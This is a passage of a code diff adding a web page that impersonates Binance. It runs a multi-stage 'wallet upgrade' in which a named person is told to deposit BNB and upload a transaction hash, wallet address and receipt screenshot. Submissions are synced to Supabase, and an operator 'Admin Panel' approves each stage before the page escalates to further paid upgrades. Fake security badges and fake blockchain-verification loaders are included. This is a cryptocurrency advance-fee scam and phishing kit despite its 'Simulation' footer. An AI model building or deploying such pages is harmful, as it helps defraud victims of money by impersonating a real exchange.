+                                    <div id="dropzone" onclick="document.getElementById('receipt-file').click()" class="dropzone-dashed rounded-xl p-6 text-center cursor-pointer hover:bg-binance-bgPrimary/50 transition relative flex flex-col items-center justify-center min-h-[140px]">
+                                        <input type="file" id="receipt-file" accept="image/*" class="hidden" onchange="handleFileSelect(event)">
+                                        
+                                        <div id="dropzone-prompt" class="space-y-2">
+                                            <div class="w-12 h-12 rounded-full bg-binance-bgInput flex items-center justify-center text-binance-yellow mx-auto">
+                                                <i class="fa-solid fa-cloud-arrow-up text-xl"></i>
+                                            </div>
+                                            <div class="text-xs text-binance-textMain">
+                                                <span class="text-binance-yellow font-semibold">Click to upload</span> or drag and drop screenshot
+                                            </div>
+                                            <div class="text-[10px] text-binance-textMuted">PNG, JPG, WEBP up to 10MB</div>
+                                        </div>
+
+                                        <div id="file-preview-container" class="hidden flex items-center space-x-3 bg-binance-bgPrimary p-3 rounded-xl border border-binance-border w-full max-w-sm">
+                                            <img id="preview-img" src="" alt="Receipt Preview" class="w-12 h-12 object-cover rounded-lg border border-binance-border">
+                                            <div class="flex-1 text-left truncate">
+                                                <div id="file-name" class="text-xs font-semibold text-white truncate">receipt.png</div>
+                                                <div id="file-size" class="text-[10px] text-binance-textMuted">1.2 MB</div>
+                                            </div>
+                                            <button type="button" onclick="removeSelectedFile(event)" class="text-binance-textMuted hover:text-binance-red p-1.5 text-xs">
+                                                <i class="fa-solid fa-xmark"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="pt-2">
+                                    <button type="submit" id="submit-proof-btn" class="w-full bg-binance-yellow hover:bg-binance-yellowHover text-binance-bgPrimary font-bold py-3.5 rounded-xl transition shadow-lg shadow-binance-yellow/10 flex items-center justify-center gap-2 text-sm">
+                                        <i class="fa-solid fa-paper-plane"></i>
+                                        <span>Submit Payment Proof for Verification</span>
+                                    </button>
+                                </div>
+                            </form>
+                        </div>
+
+                        <!-- VIEW 3: WAITING FOR ADMIN APPROVAL -->
+                        <div id="view-waiting-step" class="space-y-6 hidden text-center py-6">
+                            <div class="relative w-28 h-28 mx-auto flex items-center justify-center">
+                                <div class="absolute inset-0 rounded-full border-4 border-binance-bgInput border-t-binance-yellow animate-spin"></div>
+                                <div class="binance-loader w-12 h-12 z-10">
+                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 120 120" width="100%" height="100%">
+                                        <path class="binance-part top-chevron" d="M60,10 L84.7,34.7 L72.3,47.1 L60,34.7 L47.7,47.1 L35.3,34.7 Z" />
+                                        <polygon class="binance-part left-diamond" points="17.7,60 30.1,47.6 42.5,60 30.1,72.4" />
+                                        <polygon class="binance-part center-diamond" points="60,47.6 72.4,60 60,72.4 47.6,60" />
+                                        <polygon class="binance-part right-diamond" points="102.3,60 89.9,47.6 77.5,60 89.9,72.4" />
+                                        <path class="binance-part bottom-chevron" d="M60,110 L35.3,85.3 L47.7,72.9 L60,85.3 L72.3,72.9 L84.7,85.3 Z" />
+                                    </svg>
+                                </div>
+                            </div>
+
+                            <div>
+                                <span class="inline-block px-3 py-1 bg-yellow-500/10 text-binance-yellow rounded-full text-xs font-semibold uppercase tracking-wider mb-2 border border-yellow-500/20">
+                                    Status: Pending Verification
+                                </span>
+                                <h2 class="text-2xl font-bold text-white">Verifying Payment Proof</h2>
+                                <p class="text-xs text-binance-textMuted max-w-md mx-auto mt-2 leading-relaxed">
+                                    Your payment details have been submitted. Our system and admins are verifying the blockchain transaction on BscScan.
+                                </p>
+                            </div>
+
+                            <div class="bg-binance-bgPrimary border border-binance-border rounded-xl p-4 text-left max-w-md mx-auto space-y-3 font-mono text-xs">
+                                <div class="flex justify-between border-b border-binance-border/50 pb-2">
+                                    <span class="text-binance-textMuted">Amount</span>
+                                    <span class="text-white font-bold" id="display-submitted-amount">2.6 BNB</span>
+                                </div>
+                                <div class="flex justify-between border-b border-binance-border/50 pb-2">
+                                    <span class="text-binance-textMuted">Tx Hash</span>
+                                    <span class="text-binance-yellow truncate ml-4 max-w-[200px]" id="display-submitted-hash">0x8a91...3f21</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-binance-textMuted">Payer Wallet</span>
+                                    <span class="text-white truncate ml-4 max-w-[200px]" id="display-submitted-wallet">0x1234...5678</span>
+                                </div>
+                            </div>
+
+                            <div class="bg-binance-bgInput/50 border border-binance-border rounded-xl p-4 max-w-md mx-auto flex items-center justify-between text-xs text-left">
+                                <div class="flex items-center space-x-3">
+                                    <i class="fa-solid fa-user-shield text-binance-yellow text-lg shrink-0"></i>
+                                    <div>
+                                        <div class="font-semibold text-white">Manual Verification in Progress</div>
+                                        <div class="text-[11px] text-binance-textMuted">An administrator will confirm your transaction on BscScan shortly.</div>
+                                    </div>
+                                </div>
+                                <button onclick="openAdminDemoModal()" class="bg-binance-bgCard border border-binance-yellow/40 text-binance-yellow hover:bg-binance-yellow/10 px-3 py-1.5 rounded-lg text-xs font-bold transition shrink-0 flex items-center gap-1.5">
+                                    <i class="fa-solid fa-sliders"></i>
+                                    <span>Admin Panel</span>
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- VIEW 4: APPROVED & AUTOMATIC REDIRECT -->
+                        <div id="view-success-step" class="space-y-6 hidden text-center py-6">
+                            <div class="w-20 h-20 bg-binance-green/20 border-2 border-binance-green rounded-full flex items-center justify-center text-binance-green text-3xl mx-auto shadow-xl shadow-binance-green/10">
+                                <i class="fa-solid fa-check-double"></i>
+                            </div>
+
+                            <div>
+                                <h2 class="text-2xl font-bold text-white">Payment Confirmed!</h2>
+                                <p class="text-xs text-binance-textMuted max-w-md mx-auto mt-2">
+                                    Admin has approved your transaction proof. Access granted successfully.
+                                </p>
+                            </div>
+
+                            <div class="bg-binance-bgPrimary border border-binance-border rounded-xl p-6 max-w-md mx-auto text-center space-y-3">
+                                <div class="text-xs text-binance-textMuted uppercase font-semibold">Redirecting to Completion Screen</div>
+                                <div id="redirect-countdown" class="text-4xl font-bold text-binance-yellow font-mono">3</div>
+                                <div class="w-full bg-binance-bgInput h-2 rounded-full overflow-hidden">
+                                    <div id="redirect-bar" class="bg-binance-yellow h-full w-full transition-all duration-1000 ease-linear"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+
+                <!-- Right Column: Timeline & Binance Assurances -->
+                <div class="lg:col-span-4 space-y-6">
+                    
+                    <!-- Live Status Timeline Panel -->
+                    <div class="bg-binance-bgCard border border-binance-border rounded-2xl p-6 shadow-xl space-y-4">
+                        <h3 class="text-sm font-bold text-white flex items-center gap-2">
+                            <i class="fa-solid fa-clock-rotate-left text-binance-yellow"></i>
+                            <span>Transaction Timeline</span>
+                        </h3>
+
+                        <div class="space-y-4 relative pl-4 border-l-2 border-binance-border ml-2 text-xs">
+                            <div class="relative" id="timeline-item-1">
+                                <div class="absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-yellow border-2 border-binance-bgCard"></div>
+                                <div class="font-semibold text-white">Checkout Initiated</div>
+                                <div class="text-[10px] text-binance-textMuted">BNB BEP20 deposit generated</div>
+                            </div>
+
+                            <div class="relative" id="timeline-item-2">
+                                <div id="timeline-dot-2" class="absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-border border-2 border-binance-bgCard"></div>
+                                <div id="timeline-title-2" class="font-semibold text-binance-textMuted">Proof Submission</div>
+                                <div id="timeline-sub-2" class="text-[10px] text-binance-textMuted">Waiting for Tx Hash & screenshot</div>
+                            </div>
+
+                            <div class="relative" id="timeline-item-3">
+                                <div id="timeline-dot-3" class="absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-border border-2 border-binance-bgCard"></div>
+                                <div id="timeline-title-3" class="font-semibold text-binance-textMuted">Admin Manual Review</div>
+                                <div id="timeline-sub-3" class="text-[10px] text-binance-textMuted">Verification against BscScan ledger</div>
+                            </div>
+
+                            <div class="relative" id="timeline-item-4">
+                                <div id="timeline-dot-4" class="absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-border border-2 border-binance-bgCard"></div>
+                                <div id="timeline-title-4" class="font-semibold text-binance-textMuted">Auto Redirect & Access</div>
+                                <div id="timeline-sub-4" class="text-[10px] text-binance-textMuted">Instant unlock upon approval</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Binance Trust & Security Badges -->
+                    <div class="bg-binance-bgCard border border-binance-border rounded-2xl p-5 space-y-3">
+                        <div class="flex items-center space-x-3 text-xs text-binance-textMuted">
+                            <i class="fa-solid fa-shield-cat text-binance-yellow text-lg shrink-0"></i>
+                            <div>
+                                <div class="font-semibold text-white">Binance Secure Deposit Guard</div>
+                                <div class="text-[10px]">End-to-end transaction monitoring</div>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-3 text-xs text-binance-textMuted pt-2 border-t border-binance-border/50">
+                            <i class="fa-solid fa-bolt text-binance-green text-lg shrink-0"></i>
+                            <div>
+                                <div class="font-semibold text-white">Instant Verification Network</div>
+                                <div class="text-[10px]">Automated match on BEP20 block confirmation</div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </main>
+
+        <!-- Footer -->
+        <footer class="border-t border-binance-border bg-binance-bgSecondary py-4 mt-12 text-center text-xs text-binance-textMuted">
+            <div class="max-w-7xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-2">
+                <div>© 2026 Binance Pay Checkout Simulation. All rights reserved.</div>
+                <div class="flex space-x-4">
+                    <a href="javascript:void(0)" class="hover:text-binance-yellow transition">Privacy Policy</a>
+                    <a href="javascript:void(0)" class="hover:text-binance-yellow transition">Terms of Service</a>
+                    <a href="javascript:void(0)" class="hover:text-binance-yellow transition">API Support</a>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- Full-Screen Completion Overlay -->
+    <div id="completion-overlay" class="fixed inset-0 bg-[#0B0E11] z-50 flex flex-col items-center justify-center p-4 sm:p-6 text-center hidden">
+        <div class="w-16 h-16 sm:w-20 sm:h-20 bg-binance-yellow/20 rounded-full flex items-center justify-center text-binance-yellow text-3xl sm:text-4xl mb-4 sm:mb-6 border border-binance-yellow/40 shadow-xl shadow-binance-yellow/10">
+            <i class="fa-solid fa-rocket"></i>
+        </div>
+        
+        <h1 id="overlay-header-text" class="text-xl sm:text-3xl font-bold mb-3 uppercase tracking-wide max-w-3xl leading-snug text-white">
+            THANK YOU FOR COMPLETING THE BASIC UPGRADE PROCEDURE KOICHI IKEDA.
+        </h1>
+        
+        <p id="overlay-sub-text" class="text-binance-textMuted max-w-lg text-xs sm:text-sm mb-6 sm:mb-8 uppercase tracking-wider font-medium">
+            YOUR BASIC BINANCE JAPAN WALLET IS SUCCESSFUL
+        </p>
+
+        <button id="overlay-proceed-btn" onclick="handleOverlayProceed()" class="w-full sm:w-auto bg-binance-yellow hover:bg-binance-yellowHover text-binance-bgPrimary font-bold px-6 sm:px-8 py-3.5 sm:py-4 rounded-xl transition text-xs sm:text-base shadow-xl shadow-binance-yellow/20 hover:scale-105 active:scale-95">
+            Please kindly click here to proceed
+        </button>
+    </div>
+
+    <!-- Admin Simulation Control Modal -->
+    <div id="admin-modal" class="fixed inset-0 bg-black/70 backdrop-blur-sm z-50 flex items-center justify-center hidden p-4">
+        <div class="bg-binance-bgCard border border-binance-yellow/40 rounded-2xl max-w-md w-full p-6 shadow-2xl space-y-5">
+            <div class="flex items-center justify-between pb-3 border-b border-binance-border">
+                <div class="flex items-center space-x-2 text-binance-yellow font-bold">
+                    <i class="fa-solid fa-sliders"></i>
+                    <span>Admin Review Panel</span>
+                </div>
+                <button onclick="closeAdminDemoModal()" class="text-binance-textMuted hover:text-white">
+                    <i class="fa-solid fa-xmark text-lg"></i>
+                </button>
+            </div>
+
+            <p class="text-xs text-binance-textMuted">
+                Review and manually process the submitted deposit proof (Approve or Reject).
+            </p>
+
+            <div class="space-y-3">
+                <button onclick="adminAction('approve')" class="w-full bg-binance-green hover:opacity-90 text-binance-bgPrimary font-bold py-3 rounded-xl transition flex items-center justify-center gap-2 text-xs">
+                    <i class="fa-solid fa-circle-check"></i>
+                    <span>Approve Payment (Trigger Redirection)</span>
+                </button>
+
+                <button onclick="adminAction('reject')" class="w-full bg-binance-red/20 border border-binance-red/40 hover:bg-binance-red/30 text-binance-red font-bold py-3 rounded-xl transition flex items-center justify-center gap-2 text-xs">
+                    <i class="fa-solid fa-circle-xmark"></i>
+                    <span>Reject Payment Proof (Request Resubmission)</span>
+                </button>
+
+                <button onclick="resetToInitialState()" class="w-full bg-binance-bgInput hover:bg-binance-border text-binance-textMain py-2.5 rounded-xl transition text-xs">
+                    Reset Entire Checkout Session
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="New/supabase-config.js"></script>
+    <script>
+        // Global Loader Helper Function
+        function triggerBinanceLoader(title, subtitle, durationMs, callback) {
+            const loaderOverlay = document.getElementById('global-binance-loader');
+            const titleEl = document.getElementById('global-loader-title');
+            const subtitleEl = document.getElementById('global-loader-subtitle');
+
+            if (titleEl) titleEl.innerText = title || "Processing...";
+            if (subtitleEl) subtitleEl.innerText = subtitle || "Please wait while connecting to Binance Node";
+
+            if (loaderOverlay) {
+                loaderOverlay.classList.remove('hidden');
+            }
+
+            setTimeout(() => {
+                if (loaderOverlay) {
+                    loaderOverlay.classList.add('hidden');
+                }
+                if (typeof callback === 'function') {
+                    callback();
+                }
+            }, durationMs || 1500);
+        }
+
+        // Application State
+        let currentStage = 'basic'; // 'basic', 'advanced', 'premium'
+        let currentStep = 1;
+        let timerSeconds = 899;
+        let redirectSeconds = 3;
+        let redirectTimer = null;
+        let initialCountdown = 10;
+        let initialDotsInterval = null;
+
+        // Current required deposit amount in BNB
+        let depositBnbAmount = 2.6;
+
+        // Baseline rate
+        window.lastBnbPrice = 120665;
+        window.lastBnbChange = 1.19;
+
+        function applyWalletUpgradeApprovalState() {
+            const status = localStorage.getItem('walletUpgradeApproval');
+            if (status === 'APPROVED') {
+                if (currentStep !== 4) {
+                    goToStep(4);
+                }
+                if (!redirectTimer) {
+                    startRedirectCountdown();
+                }
+                return true;
+            }
+            return false;
+        }
+
+        // Window Load Handler
+        window.onload = function() {
+            if (applyWalletUpgradeApprovalState()) {
+                return;
+            }
+            startInitialRedirectionSequence();
+            fetchLiveBnbPrice();
+            setInterval(fetchLiveBnbPrice, 4000);
+        };
+
+        window.addEventListener('storage', function(event) {
+            if (event.key === 'walletUpgradeApproval' || event.key === 'walletUpgradeStatus') {
+                if (event.newValue === 'APPROVED' || localStorage.getItem('walletUpgradeApproval') === 'APPROVED') {
+                    applyWalletUpgradeApprovalState();
+                }
+            }
+        });
+
+        // 1. Initial Redirection Screen Animation & Timer
+        function startInitialRedirectionSequence() {
+            const timerEl = document.getElementById('initial-countdown-timer');
+            const progressBar = document.getElementById('initial-progress-bar');
+            const dotsEl = document.getElementById('redirect-dots');
+
+            // Animated live dots
+            let dotCount = 4;
+            initialDotsInterval = setInterval(() => {
+                dotCount = (dotCount % 4) + 1;
+                if (dotsEl) dotsEl.innerText = '.'.repeat(dotCount);
+            }, 350);
+
+            // 10 second countdown timer
+            const countdownInterval = setInterval(() => {
+                initialCountdown--;
+                if (timerEl) timerEl.innerText = initialCountdown;
+                if (progressBar) progressBar.style.width = `${(initialCountdown / 10) * 100}%`;
+
+                if (initialCountdown <= 0) {
+                    clearInterval(countdownInterval);
+                    clearInterval(initialDotsInterval);
+                    transitionToWelcomeScreen();
+                }
+            }, 1000);
+        }
+
+        // 2. Transition from Redirection Screen to Welcome & Consent Page
+        function transitionToWelcomeScreen() {
+            const screenRedirection = document.getElementById('screen-redirection');
+            const screenWelcome = document.getElementById('screen-welcome');
+
+            screenRedirection.classList.add('opacity-0');
+            setTimeout(() => {
+                screenRedirection.classList.add('hidden');
+                screenWelcome.classList.remove('hidden');
+            }, 500);
+        }
+
+        // 3. Consent Accepted: Launch Main Binance Wallet Upgrade Application with Binance Loader
+        function acceptWelcomeConsent() {
+            const screenWelcome = document.getElementById('screen-welcome');
+            const screenMainApp = document.getElementById('screen-main-app');
+
+            triggerBinanceLoader(
+                "Initializing Wallet Portal",
+                "Establishing encrypted connection with Binance Pay gateway...",
+                1600,
+                () => {
+                    screenWelcome.classList.add('hidden');
+                    screenMainApp.classList.remove('hidden');
+                    startTimer();
+                    showToast('Welcome to Binance Japan Wallet Upgrade Portal', 'success');
+                }
+            );
+        }
+
+        // 4. "I Have Made The Payment" Button Click Handler with Binance Loader
+        function handleMadePaymentClick() {
+            triggerBinanceLoader(
+                "Verifying BNB Smart Chain Deposit",
+                "Querying network for incoming BEP20 transfers...",
+                1500,
+                () => {
+                    goToStep(2);
+                }
+            );
+        }
+
+        // Checkout Countdown Timer
+        function startTimer() {
+            const timerElement = document.getElementById('timer-display');
+            setInterval(() => {
+                if (timerSeconds > 0) {
+                    timerSeconds--;
+                    const m = Math.floor(timerSeconds / 60).toString().padStart(2, '0');
+                    const s = (timerSeconds % 60).toString().padStart(2, '0');
+                    if (timerElement) timerElement.innerText = `${m}:${s}`;
+                } else if (timerElement) {
+                    timerElement.innerText = "00:00";
+                    timerElement.classList.add('text-binance-red');
+                }
+            }, 1000);
+        }
+
+        // Live Price Fetching (Binance / CryptoCompare)
+        async function fetchLiveBnbPrice() {
+            let price = window.lastBnbPrice;
+            let changePct = window.lastBnbChange;
+            let fetched = false;
+
+            try {
+                const response = await fetch('https://min-api.cryptocompare.com/data/pricemultifull?fsyms=BNB&tsyms=JPY');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data?.RAW?.BNB?.JPY) {
+                        price = data.RAW.BNB.JPY.PRICE;
+                        changePct = data.RAW.BNB.JPY.CHANGEPCT24HOUR;
+                        fetched = true;
+                    }
+                }
+            } catch (e) {}
+
+            if (!fetched) {
+                try {
+                    const response = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=BNBJPY');
+                    if (response.ok) {
+                        const data = await response.json();
+                        price = parseFloat(data.lastPrice);
+                        changePct = parseFloat(data.priceChangePercent);
+                        fetched = true;
+                    }
+                } catch (e) {}
+            }
+
+            if (!fetched) {
+                const tick = (Math.random() - 0.48) * 120;
+                price = Math.max(70000, window.lastBnbPrice + tick);
+                changePct = window.lastBnbChange + (Math.random() - 0.5) * 0.04;
+            }
+
+            window.lastBnbPrice = price;
+            window.lastBnbChange = changePct;
+
+            updatePriceUI(price, changePct);
+        }
+
+        function updatePriceUI(price, changePct) {
+            const priceEl = document.getElementById('bnb-live-price');
+            const changeEl = document.getElementById('bnb-price-change');
+            const jpyDepositEl = document.getElementById('deposit-jpy-amount');
+            const summaryJpyEl = document.getElementById('summary-jpy-val');
+
+            if (priceEl && price) {
+                priceEl.innerText = `¥${Math.round(price).toLocaleString('en-US')}`;
+            }
+
+            if (changeEl && changePct !== undefined) {
+                const isPositive = changePct >= 0;
+                const sign = isPositive ? '+' : '';
+                const colorClass = isPositive ? 'text-binance-green' : 'text-binance-red';
+                const icon = isPositive ? 'fa-caret-up' : 'fa-caret-down';
+
+                changeEl.className = `text-[10px] sm:text-xs ${colorClass} flex items-center font-mono font-semibold`;
+                changeEl.innerHTML = `<i class="fa-solid ${icon} mr-0.5"></i>${sign}${changePct.toFixed(2)}%`;
+            }
+
+            if (price) {
+                const jpyEquivalent = Math.round(depositBnbAmount * price).toLocaleString('en-US');
+                if (jpyDepositEl) jpyDepositEl.innerText = `≈ ¥${jpyEquivalent} JPY`;
+                if (summaryJpyEl) summaryJpyEl.innerText = `≈ ¥${jpyEquivalent}`;
+            }
+        }
+
+        function copyToClipboard(text, successMsg) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            try {
+                document.execCommand('copy');
+                showToast(successMsg || 'Copied to clipboard!', 'success');
+            } catch (err) {
+                showToast('Failed to copy', 'error');
+            }
+            document.body.removeChild(textArea);
+        }
+
+        function goToStep(step) {
+            currentStep = step;
+            updateStepUI();
+        }
+
+        function updateStepUI() {
+            document.getElementById('view-deposit-step').classList.add('hidden');
+            document.getElementById('view-proof-step').classList.add('hidden');
+            document.getElementById('view-waiting-step').classList.add('hidden');
+            document.getElementById('view-success-step').classList.add('hidden');
+
+            if (currentStep === 1) {
+                document.getElementById('view-deposit-step').classList.remove('hidden');
+            } else if (currentStep === 2) {
+                document.getElementById('view-proof-step').classList.remove('hidden');
+            } else if (currentStep === 3) {
+                document.getElementById('view-waiting-step').classList.remove('hidden');
+            } else if (currentStep === 4) {
+                document.getElementById('view-success-step').classList.remove('hidden');
+            }
+
+            for (let i = 1; i <= 4; i++) {
+                const node = document.getElementById(`step-node-${i}`);
+                const label = document.getElementById(`step-label-${i}`);
+                
+                if (i < currentStep) {
+                    node.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-green text-binance-bgPrimary flex items-center justify-center font-bold text-xs sm:text-sm shadow-md";
+                    node.innerHTML = '<i class="fa-solid fa-check"></i>';
+                    label.className = "text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-green text-center";
+                } else if (i === currentStep) {
+                    node.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-yellow text-binance-bgPrimary flex items-center justify-center font-bold text-xs sm:text-sm shadow-lg shadow-binance-yellow/20";
+                    if (i === 4) node.innerHTML = '<i class="fa-solid fa-check"></i>';
+                    else node.innerText = i;
+                    label.className = "text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-yellow text-center";
+                } else {
+                    node.className = "w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-binance-bgCard text-binance-textMuted border-2 border-binance-border flex items-center justify-center font-bold text-xs sm:text-sm";
+                    node.innerText = i === 4 ? '✓' : i;
+                    label.className = "text-[10px] sm:text-xs font-medium mt-1.5 sm:mt-2 text-binance-textMuted text-center";
+                }
+            }
+
+            const progressPct = ((currentStep - 1) / 3) * 100;
+            document.getElementById('step-progress-bar').style.width = `${Math.max(12, progressPct)}%`;
+
+            updateTimelineUI();
+        }
+
+        function updateTimelineUI() {
+            if (currentStep >= 2) {
+                document.getElementById('timeline-dot-2').className = "absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-yellow border-2 border-binance-bgCard";
+                document.getElementById('timeline-title-2').className = "font-semibold text-white";
+            } else {
+                document.getElementById('timeline-dot-2').className = "absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-border border-2 border-binance-bgCard";
+                document.getElementById('timeline-title-2').className = "font-semibold text-binance-textMuted";
+            }
+
+            if (currentStep >= 3) {
+                document.getElementById('timeline-dot-3').className = "absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-yellow border-2 border-binance-bgCard";
+                document.getElementById('timeline-title-3').className = "font-semibold text-white";
+            } else {
+                document.getElementById('timeline-dot-3').className = "absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-border border-2 border-binance-bgCard";
+                document.getElementById('timeline-title-3').className = "font-semibold text-binance-textMuted";
+            }
+
+            if (currentStep >= 4) {
+                document.getElementById('timeline-dot-4').className = "absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-green border-2 border-binance-bgCard";
+                document.getElementById('timeline-title-4').className = "font-semibold text-binance-green";
+                document.getElementById('timeline-sub-4').innerText = "Verified & Auto-Redirected";
+            } else {
+                document.getElementById('timeline-dot-4').className = "absolute -left-[21px] top-0.5 w-2.5 h-2.5 rounded-full bg-binance-border border-2 border-binance-bgCard";
+                document.getElementById('timeline-title-4').className = "font-semibold text-binance-textMuted";
+                document.getElementById('timeline-sub-4').innerText = "Instant unlock upon approval";
+            }
+        }
+
+        function handleFileSelect(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(evt) {
+                    const dataUrl = evt.target.result;
+                    localStorage.setItem('walletUpgradeLastImage', dataUrl);
+                    document.getElementById('preview-img').src = dataUrl;
+                    document.getElementById('file-name').innerText = file.name;
+                    document.getElementById('file-size').innerText = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
+                    document.getElementById('dropzone-prompt').classList.add('hidden');
+                    document.getElementById('file-preview-container').classList.remove('hidden');
+                    showToast('Receipt attached successfully', 'success');
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        function removeSelectedFile(e) {
+            e.stopPropagation();
+            document.getElementById('receipt-file').value = '';
+            localStorage.removeItem('walletUpgradeLastImage');
+            document.getElementById('dropzone-prompt').classList.remove('hidden');
+            document.getElementById('file-preview-container').classList.add('hidden');
+            showToast('Receipt file removed', 'info');
+        }
+
+        function handleProofSubmit(e) {
+            e.preventDefault();
+            const txHash = document.getElementById('tx-hash-input').value.trim();
+            const userWallet = document.getElementById('user-wallet-input').value.trim();
+            const fileInput = document.getElementById('receipt-file');
+            const uploadedFile = fileInput && fileInput.files && fileInput.files[0];
+
+            if (!txHash.startsWith('0x') || txHash.length < 15) {
+                showToast('Please enter a valid BscScan TxHash starting with 0x...', 'error');
+                return;
+            }
+
+            const submission = {
+                id: `${Date.now()}-${Math.random().toString(16).slice(2)}`,
+                userName: 'Wallet Upgrade User',
+                userEmail: 'wallet-upgrade@customer.local',
+                amount: `${depositBnbAmount} BNB`,
+                senderAddress: userWallet,
+                txHash,
+                fileName: uploadedFile ? uploadedFile.name : 'receipt.png',
+                fileType: uploadedFile ? uploadedFile.type : 'image/png',
+                fileSize: uploadedFile ? `${(uploadedFile.size / 1024 / 1024).toFixed(2)} MB` : '0.00 MB',
+                uploadTime: new Date().toLocaleString(),
+                status: 'PENDING',
+                fileData: uploadedFile ? localStorage.getItem('walletUpgradeLastImage') || '' : localStorage.getItem('walletUpgradeLastImage') || ''
+            };
+
+            const list = JSON.parse(localStorage.getItem('walletUpgradeSubmissions') || '[]');
+            list.push(submission);
+            localStorage.setItem('walletUpgradeSubmissions', JSON.stringify(list));
+            localStorage.setItem('walletUpgradeStatus', 'PENDING');
+            localStorage.setItem('walletUpgradeLastSubmission', JSON.stringify(submission));
+
+            if (typeof createWalletUpgradeSubmission === 'function') {
+                createWalletUpgradeSubmission(submission).catch((error) => {
+                    console.warn('Supabase wallet-upgrade submission sync failed:', error);
+                });
+            }
+
+            triggerBinanceLoader(
+                "Submitting Payment Proof",
+                "Broadcasting TxHash to BscScan verification ledger...",
+                1800,
+                () => {
+                    document.getElementById('display-submitted-amount').innerText = `${depositBnbAmount} BNB`;
+                    document.getElementById('display-submitted-hash').innerText = `${txHash.substring(0, 8)}...${txHash.substring(txHash.length - 6)}`;
+                    document.getElementById('display-submitted-wallet').innerText = userWallet.length > 14 ? `${userWallet.substring(0, 8)}...${userWallet.substring(userWallet.length - 6)}` : userWallet;
+
+                    showToast('Payment proof submitted successfully!', 'success');
+                    goToStep(3);
+                }
+            );
+        }
+
+        function triggerAdminApprovalNow() {
+            closeAdminDemoModal();
+            triggerBinanceLoader(
+                "Admin Authorization Granted",
+                "Unlocking account privileges and updating status...",
+                1400,
+                () => {
+                    goToStep(4);
+                    
+                    try {
+                        confetti({
+                            particleCount: 80,
+                            spread: 70,
+                            origin: { y: 0.6 },
+                            colors: ['#F0B90B', '#0ECB81', '#FFFFFF']
+                        });
+                    } catch(e) {}
+
+                    showToast('Payment Approved by Admin!', 'success');
+                    startRedirectCountdown();
+                }
+            );
+        }
+
+        function startRedirectCountdown() {
+            redirectSeconds = 3;
+            const redirectEl = document.getElementById('redirect-countdown');
+            const barEl = document.getElementById('redirect-bar');
+            
+            if (barEl) barEl.style.width = '100%';
+
+            redirectTimer = setInterval(() => {
+                redirectSeconds--;
+                if (redirectEl) redirectEl.innerText = redirectSeconds;
+                if (barEl) barEl.style.width = `${(redirectSeconds / 3) * 100}%`;
+
+                if (redirectSeconds <= 0) {
+                    clearInterval(redirectTimer);
+                    showCompletionOverlay();
+                }
+            }, 1000);
+        }
+
+        function showCompletionOverlay() {
+            const overlay = document.getElementById('completion-overlay');
+            const headerEl = document.getElementById('overlay-header-text');
+            const subEl = document.getElementById('overlay-sub-text');
+            const proceedBtn = document.getElementById('overlay-proceed-btn');
+
+            if (currentStage === 'basic') {
+                headerEl.innerText = "THANK YOU FOR COMPLETING THE BASIC UPGRADE PROCEDURE KOICHI IKEDA.";
+                subEl.innerText = "YOUR BASIC BINANCE JAPAN WALLET IS SUCCESSFUL";
+                proceedBtn.innerText = "Please kindly click here to proceed";
+            } else if (currentStage === 'advanced') {
+                headerEl.innerText = "THANK YOU FOR COMPLETING THE ADVANCE UPGRADE PROCEDURE KOICHI IKEDA.";
+                subEl.innerText = "YOUR ADVANCED JAPAN IS SUCCESSFUL";
+                proceedBtn.innerText = "Click here to proceed to the final Procedure";
+            } else if (currentStage === 'premium') {
+                headerEl.innerText = "THANK YOU FOR COMPLETING THE PREMIUM UPGRADE PROCEDURE KOICHI IKEDA.";
+                subEl.innerText = "YOUR PREMIUM BINANCE JAPAN WALLET IS SUCCESSFUL";
+                proceedBtn.innerText = "Wallet Upgrade Completed";
+            }
+
+            overlay.classList.remove('hidden');
+        }
+
+        function handleOverlayProceed() {
+            const overlay = document.getElementById('completion-overlay');
+            overlay.classList.add('hidden');
+
+            if (currentStage === 'basic') {
+                localStorage.setItem('postUpgradeAction', 'openSendFlow');
+                window.location.href = 'wallet.html';
+                return;
+            }
+
+            if (currentStage === 'advanced') {
+                localStorage.setItem('postUpgradeAction', 'openSendFlow');
+                window.location.href = 'wallet.html';
+                return;
+            }
+
+            if (currentStage === 'premium') {
+                localStorage.setItem('postUpgradeAction', 'openSendFlow');
+                window.location.href = 'wallet.html';
+                return;
+            }
+        }
+
+        function startAdvancedUpgrade() {
+            currentStage = 'advanced';
+            depositBnbAmount = 2.0;
+
